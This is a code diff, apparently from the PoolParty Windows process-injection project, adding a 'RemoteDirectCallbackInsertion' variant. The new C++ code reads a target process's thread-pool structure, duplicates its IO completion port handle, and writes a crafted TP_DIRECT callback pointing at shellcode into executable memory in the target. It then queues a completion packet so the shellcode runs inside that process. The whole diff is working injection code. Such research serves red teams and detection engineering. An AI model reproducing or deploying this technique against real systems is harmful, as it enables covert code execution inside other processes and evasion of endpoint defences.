@@ -327,3 +327,29 @@ void RemoteJobCallbackInsertion::SetupExecution() const
 	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
 	BOOST_LOG_TRIVIAL(info) << boost::format("Assign current process to job object `%ws` to queue a packet to the IO completion port of the target process worker factory") % POOL_PARTY_JOB_NAME;
 }
+
+RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
+	: PoolParty{ dwTargetPid, cShellcode }
+{
+}
+
+void RemoteDirectCallbackInsertion::SetupExecution() const
+{
+	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
+
+	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+
+	TP_DIRECT Direct = { 0 };
+	Direct.Callback = m_ShellcodeAddress;
+	BOOST_LOG_TRIVIAL(info) << "Manually crafted TP_DIRECT structure associated with the shellcode";
+
+	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
+	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_DIRECT memory in the target process: %p") % RemoteDirectAddress;
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT));
+	BOOST_LOG_TRIVIAL(info) << "Written the TP_DIRECT structure to the target process";
+
+	w_ZwSetIoCompletion(*p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
+	BOOST_LOG_TRIVIAL(info) << "Queued a packet to the IO completion port of the target process worker factory";
+}
